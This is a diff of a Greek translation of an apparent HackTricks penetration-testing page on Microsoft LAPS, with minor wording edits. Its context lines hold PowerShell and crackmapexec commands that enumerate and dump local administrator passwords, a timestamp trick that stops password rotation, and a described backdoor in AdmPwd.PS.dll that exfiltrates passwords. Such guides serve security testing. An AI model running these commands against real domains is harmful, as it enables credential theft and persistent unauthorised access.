@@ -41,7 +41,7 @@ Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs
 ```
 ### LAPS Password Access
 
-Μπορείτε να **κατεβάσετε την ακατέργαστη πολιτική LAPS** από `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` και στη συνέχεια να χρησιμοποιήσετε το **`Parse-PolFile`** από το [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) πακέτο για να μετατρέψετε αυτό το αρχείο σε αναγνώσιμη μορφή.
+Μπορείτε να **κατεβάσετε την ακατέργαστη πολιτική LAPS** από `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` και στη συνέχεια να χρησιμοποιήσετε **`Parse-PolFile`** από το [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) πακέτο για να μετατρέψετε αυτό το αρχείο σε αναγνώσιμη μορφή.
 
 Επιπλέον, οι **ενσωματωμένες LAPS PowerShell cmdlets** μπορούν να χρησιμοποιηθούν αν είναι εγκατεστημένες σε μια μηχανή στην οποία έχουμε πρόσβαση:
 ```powershell
@@ -64,7 +64,7 @@ Find-AdmPwdExtendedRights -Identity Workstations | fl
 # Read the password
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 ```
-**PowerView** μπορεί επίσης να χρησιμοποιηθεί για να ανακαλύψετε **ποιος μπορεί να διαβάσει τον κωδικό πρόσβασης και να τον διαβάσει**:
+**PowerView** μπορεί επίσης να χρησιμοποιηθεί για να ανακαλύψει **ποιος μπορεί να διαβάσει τον κωδικό πρόσβασης και να τον διαβάσει**:
 ```powershell
 # Find the principals that have ReadPropery on ms-Mcs-AdmPwd
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
@@ -76,7 +76,7 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
 
 Το [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) διευκολύνει την αρίθμηση του LAPS με πολλές λειτουργίες.\
 Μία είναι η ανάλυση **`ExtendedRights`** για **όλους τους υπολογιστές με ενεργοποιημένο το LAPS.** Αυτό θα δείξει **ομάδες** που έχουν **εξουσιοδοτηθεί ειδικά να διαβάζουν τους κωδικούς πρόσβασης LAPS**, οι οποίες είναι συχνά χρήστες σε προστατευμένες ομάδες.\
-Ένας **λογαριασμός** που έχει **συνδέσει έναν υπολογιστή** σε ένα τομέα λαμβάνει `All Extended Rights` πάνω σε αυτόν τον υπολογιστή, και αυτό το δικαίωμα δίνει στον **λογαριασμό** τη δυνατότητα να **διαβάζει κωδικούς πρόσβασης**. Η αρίθμηση μπορεί να δείξει έναν λογαριασμό χρήστη που μπορεί να διαβάσει τον κωδικό πρόσβασης LAPS σε έναν υπολογιστή. Αυτό μπορεί να μας βοηθήσει να **στοχεύσουμε συγκεκριμένους χρήστες AD** που μπορούν να διαβάσουν τους κωδικούς πρόσβασης LAPS.
+Ένας **λογαριασμός** που έχει **συνδέσει έναν υπολογιστή** σε έναν τομέα λαμβάνει `All Extended Rights` πάνω σε αυτόν τον υπολογιστή, και αυτό το δικαίωμα δίνει στον **λογαριασμό** τη δυνατότητα να **διαβάζει κωδικούς πρόσβασης**. Η αρίθμηση μπορεί να δείξει έναν λογαριασμό χρήστη που μπορεί να διαβάσει τον κωδικό πρόσβασης LAPS σε έναν υπολογιστή. Αυτό μπορεί να μας βοηθήσει να **στοχεύσουμε συγκεκριμένους χρήστες AD** που μπορούν να διαβάσουν τους κωδικούς πρόσβασης LAPS.
 ```powershell
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
@@ -101,7 +101,7 @@ ComputerName                Password       Expiration
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
 ## **Dumping LAPS Passwords With Crackmapexec**
-Αν δεν υπάρχει πρόσβαση σε ένα powershell, μπορείτε να εκμεταλλευτείτε αυτό το δικαίωμα απομακρυσμένα μέσω LDAP χρησιμοποιώντας
+Αν δεν υπάρχει πρόσβαση σε powershell, μπορείτε να εκμεταλλευτείτε αυτό το δικαίωμα απομακρυσμένα μέσω LDAP χρησιμοποιώντας
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
@@ -119,7 +119,7 @@ Password: 2Z@Ae)7!{9#Cq
 
 ### **Ημερομηνία Λήξης**
 
-Μόλις γίνετε διαχειριστής, είναι δυνατόν να **αποκτήσετε τους κωδικούς πρόσβασης** και να **αποτρέψετε** μια μηχανή από το **να ενημερώσει** τον **κωδικό πρόσβασης** της **ορίζοντας την ημερομηνία λήξης στο μέλλον**.
+Αφού γίνετε διαχειριστής, είναι δυνατόν να **αποκτήσετε τους κωδικούς πρόσβασης** και να **αποτρέψετε** μια μηχανή από το **να ενημερώσει** τον **κωδικό πρόσβασης** της **ορίζοντας την ημερομηνία λήξης στο μέλλον**.
 ```powershell
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
@@ -129,12 +129,12 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
 {% hint style="warning" %}
-Ο κωδικός πρόσβασης θα επαναρυθμιστεί αν ένας **admin** χρησιμοποιήσει την **`Reset-AdmPwdPassword`** cmdlet; ή αν είναι ενεργοποιημένη η επιλογή **Μην επιτρέπετε τον χρόνο λήξης κωδικού πρόσβασης μεγαλύτερο από αυτόν που απαιτεί η πολιτική** στην GPO του LAPS.
+Ο κωδικός πρόσβασης θα επαναρυθμιστεί αν ένας **admin** χρησιμοποιήσει την **`Reset-AdmPwdPassword`** cmdlet; ή αν είναι ενεργοποιημένο το **Do not allow password expiration time longer than required by policy** στην πολιτική LAPS GPO.
 {% endhint %}
 
 ### Backdoor
 
-Ο αρχικός πηγαίος κώδικας για το LAPS μπορεί να βρεθεί [εδώ](https://github.com/GreyCorbel/admpwd), επομένως είναι δυνατόν να τοποθετηθεί ένα backdoor στον κώδικα (μέσα στη μέθοδο `Get-AdmPwdPassword` στο `Main/AdmPwd.PS/Main.cs`, για παράδειγμα) που θα **εξάγει νέους κωδικούς πρόσβασης ή θα τους αποθηκεύει κάπου**.
+Ο αρχικός πηγαίος κώδικας για το LAPS μπορεί να βρεθεί [εδώ](https://github.com/GreyCorbel/admpwd), επομένως είναι δυνατόν να τοποθετηθεί ένα backdoor στον κώδικα (μέσα στη μέθοδο `Get-AdmPwdPassword` στο `Main/AdmPwd.PS/Main.cs` για παράδειγμα) που θα **εξάγει νέους κωδικούς πρόσβασης ή θα τους αποθηκεύει κάπου**.
 
 Στη συνέχεια, απλώς μεταγλωττίστε το νέο `AdmPwd.PS.dll` και ανεβάστε το στη μηχανή στο `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (και αλλάξτε την ώρα τροποποίησης).
 
@@ -151,7 +151,7 @@ Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="2326099
 
 <details>
 
-<summary>Υποστήριξη HackTricks</summary>
+<summary>Support HackTricks</summary>
 
 * Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
 * **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
